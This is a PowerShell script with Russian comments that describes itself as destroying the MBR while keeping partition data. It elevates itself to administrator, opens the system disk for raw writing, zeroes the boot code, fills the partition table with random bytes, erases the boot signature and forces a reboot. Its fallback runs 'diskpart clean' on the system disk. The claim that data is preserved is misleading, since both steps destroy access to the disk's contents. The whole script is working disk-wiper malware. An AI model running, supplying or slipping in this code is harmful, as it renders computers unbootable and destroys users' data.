# Скрипт уничтожения MBR с сохранением данных разделов
# Требует запуска от Администратора

# Проверка прав администратора
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Требуются права Администратора. Перезапуск..."
    Start-Process PowerShell -Verb RunAs -ArgumentList "-File `"$PSCommandPath`""
    exit
}

# Определяем системный диск
$systemDrive = (Get-Partition | Where-Object {$_.IsSystem -eq $true}).DiskNumber
$diskPath = "\\.\PhysicalDrive$systemDrive"

Write-Host "Целевой диск: PhysicalDrive$systemDrive" -ForegroundColor Yellow
Write-Host "УНИЧТОЖЕНИЕ MBR С СОХРАНЕНИЕМ ДАННЫХ..." -ForegroundColor Red

try {
    # Открываем диск для прямого доступа
    $fileStream = New-Object System.IO.FileStream($diskPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite)
    $writer = New-Object System.IO.BinaryWriter($fileStream)
    
    # Создаем массив нулей размером 512 байт (первый сектор)
    $nullData = New-Object byte[] 512
    
    # Перемещаемся в начало диска
    $fileStream.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
    
    # Записываем нули в первые 446 байт (загрузочный код)
    Write-Host "Уничтожение загрузочного кода (446 байт)..." -ForegroundColor Red
    $writer.Write($nullData, 0, 446)
    
    # Записываем случайные данные в область таблицы разделов (64 байта)
    Write-Host "Разрушение таблицы разделов (64 байта)..." -ForegroundColor Red
    $random = New-Object System.Random
    $randomData = New-Object byte[] 64
    $random.NextBytes($randomData)
    $writer.Write($randomData, 0, 64)
    
    # Записываем 0x0000 в сигнатуру загрузки (последние 2 байта)
    Write-Host "Уничтожение сигнатуры загрузки..." -ForegroundColor Red
    $fileStream.Seek(510, [System.IO.SeekOrigin]::Begin) | Out-Null
    $nullSignature = New-Object byte[] 2
    $writer.Write($nullSignature, 0, 2)
    
    # Сброс буфера на диск
    $writer.Flush()
    $fileStream.Flush()
    
    Write-Host "MBR ПОЛНОСТЬЮ УНИЧТОЖЕН!" -ForegroundColor Green
    Write-Host "Данные на разделах сохранены, но система не загрузится без восстановления MBR." -ForegroundColor Yellow
    Write-Host "Для восстановления потребуется загрузочный диск и инструменты восстановления MBR." -ForegroundColor Yellow
    
    # Принудительное отключение питания имитируется перезагрузкой
    Write-Host "Принудительная перезагрузка через 5 секунд..." -ForegroundColor Red
    Start-Sleep -Seconds 5
    Restart-Computer -Force
    
} catch {
    Write-Host "Ошибка: $_" -ForegroundColor Red
    Write-Host "Попытка альтернативного метода..." -ForegroundColor Yellow
    
    # Альтернативный метод через diskpart
    $scriptBlock = @"
select disk $systemDrive
clean
"@
    
    $scriptBlock | diskpart
} finally {
    if ($writer) { $writer.Close() }
    if ($fileStream) { $fileStream.Close() }
}
